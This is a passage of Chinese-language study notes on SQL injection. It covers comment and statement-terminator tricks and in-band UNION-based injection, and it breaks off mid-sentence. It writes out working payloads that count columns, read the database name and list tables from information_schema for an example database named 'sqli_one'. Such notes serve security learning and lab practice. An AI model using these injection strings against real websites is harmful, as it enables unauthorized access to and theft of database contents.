## sql注入通用要点

- URl中的**分号**表示SQL注入语句的**结束**，
- **两个破折号**导致之后的内容全部都被视为**注释**。
- **UNION**语句可用于**拼接**多个SQL语句

## 内带SQLi

利用**UNION SELECT**语句产生的错误，来**测试**原始SELECT的列数。

```sqlite
union select 1，2，3，4
```

当页面不再报错，并输出数据库结果后，查询数据库名（将其中一个值替换为 **database()**）。

```sqlite
union select 1，2，3，database()
```

获得数据库名称后，获取数据库中的相关表名，用到关键函数**group_concat（）**，该函数从多个返回的行中获取**指定列 的全部数据**以数据库“sqli_one”为例。

```python
UNION SELECT 1,2，3,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

获得表名后，对之前的命令进行调整，用于获取指定
